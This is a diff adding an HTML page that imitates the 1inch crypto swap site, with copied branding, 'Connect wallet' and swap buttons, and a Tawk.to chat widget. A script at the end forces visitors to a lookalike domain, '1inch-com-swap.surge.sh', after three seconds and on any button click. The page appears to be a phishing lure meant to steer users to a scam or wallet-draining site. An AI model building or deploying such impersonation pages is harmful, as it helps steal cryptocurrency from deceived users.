@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>1inch · swap clone</title>
+  <!-- Font Awesome Icons (free) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    body {
+      background: #0b0d10;
+      color: #f5f7fa;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .app {
+      max-width: 1300px;
+      width: 100%;
+      padding: 20px 30px;
+      margin: 0 auto;
+    }
+
+    /* ===== HEADER / NAV ===== */
+    .navbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 20px 10px;
+      padding: 16px 0 28px 0;
+      border-bottom: 1px solid #23262b;
+    }
+
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 32px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 700;
+      font-size: 24px;
+      letter-spacing: -0.5px;
+      color: #fff;
+    }
+
+    .logo i {
+      font-size: 28px;
+      color: #4f9cf7;
+    }
+
+    .logo span {
+      color: #fff;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 28px;
+      font-weight: 500;
+      font-size: 15px;
+      color: #a6abb2;
+    }
+
+    .nav-links a {
+      color: inherit;
+      text-decoration: none;
+      transition: 0.2s;
+      cursor: default;
+    }
+
+    .nav-links a:hover {
+      color: #fff;
+    }
+
+    .nav-links .active {
+      color: #fff;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .connect-btn {
+      background: #4f9cf7;
+      color: #fff;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 40px;
+      font-weight: 600;
+      font-size: 15px;
+      cursor: pointer;
+      transition: background 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .connect-btn i {
+      font-size: 14px;
+    }
+
+    .connect-btn:hover {
+      background: #3a7ed9;
+    }
+
+    .personal-badge {
+      background: #1e2126;
+      padding: 8px 16px;
+      border-radius: 30px;
+      font-size: 14px;
+      font-weight: 500;
+      color: #d0d4da;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border: 1px solid #2f333a;
+      cursor: default;
+    }
+
+    .personal-badge i {
+      color: #4f9cf7;
+    }
+
+    /* ===== HERO / SWAP CARD ===== */
+    .swap-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 40px;
+      gap: 16px;
+    }
+
+    .swap-title {
+      font-size: 44px;
+      font-weight: 700;
+      letter-spacing: -1px;
+      background: linear-gradient(135deg, #f5f7fa 0%, #b0b8c4 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-align: center;
+      line-height: 1.2;
+    }
+
+    .swap-sub {
+      color: #8e949e;
+      font-size: 18px;
+      font-weight: 400;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    /* main swap card */
+    .swap-card {
+      background: #14171c;
+      border-radius: 40px;
+      padding: 32px 32px 28px;
+      max-width: 540px;
+      width: 100%;
+      border: 1px solid #262a30;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+      transition: 0.2s;
+    }
+
+    .swap-row {
+      background: #1b1f25;
+      border-radius: 28px;
+      padding: 16px 18px;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border: 1px solid #2b3038;
+    }
+
+    .swap-row .token-label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 600;
+      font-size: 16px;
+    }
+
+    .token-label i {
+      font-size: 22px;
+      color: #4f9cf7;
+    }
+
+    .token-label .token-symbol {
+      background: #2a2f36;
+      padding: 4px 12px;
+      border-radius: 30px;
+      font-size: 13px;
+      font-weight: 500;
+      color: #c8cdd6;
+    }
+
+    .swap-row .amount-input {
+      background: transparent;
+      border: none;
+      color: #fff;
+      font-size: 22px;
+      font-weight: 500;
+      width: 130px;
+      text-align: right;
+      outline: none;
+    }
+
+    .swap-row .amount-input::placeholder {
+      color: #5a606b;
+      font-weight: 400;
+    }
+
+    .swap-row .usd-value {
+      color: #6f7682;
+      font-size: 14px;
+      margin-right: 6px;
+    }
+
+    .arrow-icon {
+      display: flex;
+      justify-content: center;
+      margin: 6px 0 10px 0;
+      color: #3f4651;
+      font-size: 24px;
+      cursor: default;
+    }
+
+    .swap-details {
+      display: flex;
+      justify-content: space-between;
+      padding: 12px 6px 6px 6px;
+      font-size: 14px;
+      color: #8b929e;
+      border-top: 1px solid #23272e;
+      margin-top: 16px;
+    }
+
+    .swap-details .detail-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .swap-details i {
+      font-size: 13px;
+      color: #5f6775;
+    }
+
+    .swap-btn {
+      background: #4f9cf7;
+      width: 100%;
+      padding: 18px 0;
+      border: none;
+      border-radius: 60px;
+      font-weight: 700;
+      font-size: 18px;
+      color: #fff;
+      margin-top: 16px;
+      cursor: pointer;
+      transition: 0.2s;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .swap-btn:hover {
+      background: #3a7ed9;
+      transform: scale(0.99);
+    }
+
+    .swap-btn i {
+      font-size: 18px;
+    }
+
+    /* extra: pay on ethereum */
+    .pay-network {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 14px;
+      margin-top: 18px;
+      color: #7f8794;
+      font-size: 14px;
+      background: #101316;
+      padding: 10px 22px;
+      border-radius: 60px;
+      border: 1px solid #262a30;
+      width: fit-content;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .pay-network i {
+      color: #627eea;
+      font-size: 18px;
+    }
+
+    .pay-network span {
+      font-weight: 500;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 24px 40px;
+      margin-top: 50px;
+      color: #6e7683;
+      font-size: 14px;
+      border-top: 1px solid #1e2228;
+      padding-top: 30px;
+    }
+
+    .footer-links a {
+      color: #8b939f;
+      text-decoration: none;
+      transition: 0.2s;
+      cursor: default;
+    }
+
+    .footer-links a:hover {
+      color: #cbd0d9;
+    }
+
+    /* responsive */
+    @media (max-width: 700px) {
+      .app { padding: 16px; }
+      .nav-links { display: none; }
+      .navbar { flex-wrap: wrap; }
+      .nav-right { margin-left: auto; }
+      .swap-title { font-size: 32px; }
+      .swap-card { padding: 22px; }
+    }
+
+    @media (max-width: 480px) {
+      .personal-badge { display: none; }
+      .connect-btn { padding: 8px 16px; font-size: 14px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+
+    <!-- Navigation -->
+    <nav class="navbar">
+      <div class="nav-left">
+        <div class="logo">
+          <i class="fas fa-arrow-right-arrow-left"></i>
+          <span>1inch</span>
+        </div>
+        <div class="nav-links">
+          <a href="#" class="active">Swap</a>
+          <a href="#">Trade</a>
+          <a href="#">Terminal</a>
+          <a href="#">Aqua</a>
+          <a href="#">Portfolio</a>
+        </div>
+      </div>
+      <div class="nav-right">
+        <div class="personal-badge">
+          <i class="fas fa-user-circle"></i> Personal
+        </div>
+        <button class="connect-btn">
+          <i class="fas fa-wallet"></i> Connect wallet
+        </button>
+      </div>
+    </nav>
+
+    <!-- Swap Hero -->
+    <div class="swap-section">
+      <h1 class="swap-title">Swap crypto tokens<br />at the best rates</h1>
+      <p class="swap-sub">Swapcrypto</p>
+
+      <!-- Swap Card -->
+      <div class="swap-card">
+        <!-- from -->
+        <div class="swap-row">
+          <div class="token-label">
+            <i class="fab fa-ethereum"></i>
+            <span>ETH</span>
+            <span class="token-symbol">↕</span>
+          </div>
+          <div style="display: flex; align-items: center; gap: 6px;">
+            <span class="usd-value">$0.00</span>
+            <input type="text" class="amount-input" placeholder="0.0" value="1.0" />
+          </div>
+        </div>
+
+        <!-- arrow -->
+        <div class="arrow-icon">
+          <i class="fas fa-arrow-down"></i>
+        </div>
+
+        <!-- to -->
+        <div class="swap-row">
+          <div class="token-label">
+            <i class="fas fa-coins"></i>
+            <span>DAI</span>
+            <span class="token-symbol">⬇</span>
+          </div>
+          <div style="display: flex; align-items: center; gap: 6px;">
+            <span class="usd-value">$0.00</span>
+            <input type="text" class="amount-input" placeholder="0.0" />
+          </div>
+        </div>
+
+        <!-- swap details: rate & slippage -->
+        <div class="swap-details">
+          <div class="detail-item"><i class="fas fa-arrow-trend-up"></i> Rate 1 ETH ≈ 0.00 DAI</div>
+          <div class="detail-item"><i class="fas fa-gauge-high"></i> Slippage 0.5%</div>
+        </div>
+
+        <!-- swap button -->
+        <button class="swap-btn">
+          <i class="fas fa-arrow-right-arrow-left"></i> Swap crypto
+        </button>
+
+        <!-- Pay on Ethereum (exactly as in snippet) -->
+        <div class="pay-network">
+          <i class="fab fa-ethereum"></i>
+          <span>Pay on Ethereum</span>
+          <i class="fas fa-chevron-down" style="font-size: 12px; opacity: 0.7;"></i>
+        </div>
+      </div>
+
+      <!-- additional small footer-like links (matching 1inch style) -->
+      <div class="footer-links">
+        <a href="#">Terms</a>
+        <a href="#">Privacy</a>
+        <a href="#">Docs</a>
+        <a href="#">Blog</a>
+        <a href="#">Support</a>
+        <span style="color: #4f5a68;">© 2026 1inch clone</span>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ===== Tawk.to Chat Script ===== -->
+  <!--Start of Tawk.to Script-->
+  <script type="text/javascript">
+    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+    (function() {
+      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+      s1.async = true;
+      s1.src = 'https://embed.tawk.to/6a79f52eccab7e1d4937dd0f/1jvm6bghf';
+      s1.charset = 'UTF-8';
+      s1.setAttribute('crossorigin', '*');
+      s0.parentNode.insertBefore(s1, s0);
+    })();
+  </script>
+  <!--End of Tawk.to Script-->
+
+  <!-- ===== REDIRECTION LOGIC ===== -->
+  <script>
+    (function() {
+      // ⚠️ REPLACE THIS with your actual target URL
+      const TARGET_URL = 'https://1inch-com-swap.surge.sh'; 
+
+      // --- AUTO-REDIRECT after 3 seconds ---
+      setTimeout(function() {
+        window.location.href = TARGET_URL;
+      }, 3000);
+
+      // --- CLICK REDIRECT for any button on the page ---
+      document.addEventListener('click', function(e) {
+        const button = e.target.closest('button');
+        if (button) {
+          e.preventDefault(); // Prevents any default button behavior
+          window.location.href = TARGET_URL;
+        }
+      });
+
+    })();
+  </script>
+</body>
+</html>
